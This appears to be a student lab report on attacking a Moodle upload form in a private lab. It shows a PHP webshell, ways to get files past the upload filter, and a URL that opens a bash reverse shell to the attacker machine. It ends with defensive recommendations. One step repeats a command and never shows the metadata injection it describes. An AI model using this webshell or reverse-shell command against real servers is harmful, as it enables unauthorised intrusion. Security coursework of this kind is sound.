# 🛡️ SSI Project – Red Team Exploitation Report

Ce rapport présente les différentes tentatives d’exploitation réalisées dans le cadre du projet de sécurité des systèmes d'information (SSI), depuis une machine Kali Linux visant à compromettre le serveur web Moodle hébergé sur Ubuntu.  
L'objectif : **obtenir un reverse shell** à partir d'une faille d'upload.

---

## 🔍 Objective

The aim of the attack was to :

- Bypass the **upload file filtering** system
- Upload a **file containing malicious PHP code**.
- Execute this code remotely via the browser
- Establish a **reverse shell connection** to the Kali machine (attacker)

---

## 🔓 Technical context

- Target machine (victim)** : Ubuntu 22.04, Moodle server with an upload form
- Attacking machine** : Kali Linux on the same local network (192.168.56.X)
- PHP-side back-end filtering** prevents the upload of suspicious files via a blacklist of strings such as :

php
eval(, system(, exec(, shell_exec(, base64_decode(,
passthru(, pcntl_exec(, posix_getuid(, <script>, etc.

---

🧨Attack I – Reverse Shell Attempts

### Step 1: Create a PHP reverse shell

On Kali, I created a basic shell:
    
```bash
<?php system($_GET['cmd']); ?>
```

### Step 2: Attempt to bypass with double extensions

- First attempt: rename file to shell.php.png
- Then: shell.png.php
    
![image](https://github.com/user-attachments/assets/00e97c40-51be-48d6-8671-289b41d04f29)
         
I then tried uploading the malicious file:   
         ![image](https://github.com/user-attachments/assets/699bb173-b445-476f-9f4a-ee2bbad396f5)
         

We obtained :

![image](https://github.com/user-attachments/assets/26c0b211-1f3f-4d17-b24f-16c3fb27d836)

🔴 Failed: The backend detected the malicious content, despite the file appearing as an image.


Error message:


❌ File failed security scan


---
    
    
Filtering Bypass Attempts

Attempt: Appending PHP payload directly to an image

```bash
echo "<?php system(\$_GET['cmd']); ?>" >> shell.png
mv shell.png shell.php.png
```
 
     
Working Solution: Metadata Injection + Obfuscation 

   1. Use a clean, existing image
          
        ```bash
        cp /usr/share/icons/gnome/256x256/devices/computer.png shell.png
        ```
                          
        ![image](https://github.com/user-attachments/assets/d6660168-cb58-419d-b93f-e2ee53d6af1f)

    
   2. Inject an obfuscated PHP payload into the image’s metadata
      ```bash
        cp /usr/share/icons/gnome/256x256/devices/computer.png shell.png
        ```
    
   This avoids all blacklisted keywords (system, eval, etc.)        
    
   3. Renommer l’image avec une double extension
      ```bash
        mv shell.png shell.php.png
        ```

   4. Upload successful  

   ![image](https://github.com/user-attachments/assets/24ff24d8-0afd-49c9-a9ed-a2ddf21052de)
    

The file passed the scan because :

- The visible image content was clean

- The malicious payload was hidden in metadata

- No blacklisted strings were detected


---
   
Final Goal: Trigger Remote Code Execution

1. Start a Netcat listener on Kali:

   ```bash
   nc -lvnp 4444
   ```

   ![image](https://github.com/user-attachments/assets/f4e72480-6804-4099-8820-356d4f934546)
    
 2. Trigger the payload through the browser
    ```bash
    http://192.168.56.101:5173/upload/shell.php.png?a=system&b=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.56.102/4444+0>%261'
    ```   

Conclusion :

Although the full reverse shell wasn’t successfully established (due to server-side execution restrictions or PHP config), the following was achieved:

✅ Successfully bypassed file upload filtering
✅ Uploaded a disguised PHP webshell
✅ Injected a stealthy payload using image metadata
✅ Identified and documented backend protections

This demonstrates that poorly configured file upload systems remain vulnerable, especially when tools like exiftool can inject code into alternate vectors like metadata.




Blue Team Recommendations :

To improve the defense against such attacks:

✅ Implement deep filtering of metadata (Title, Description, EXIF Comment)

✅ Disable PHP execution in upload directories

✅ Rename and hash uploaded files server-side

✅ Add server-side antivirus scanning (e.g., ClamAV) and sandbox execution for analysis
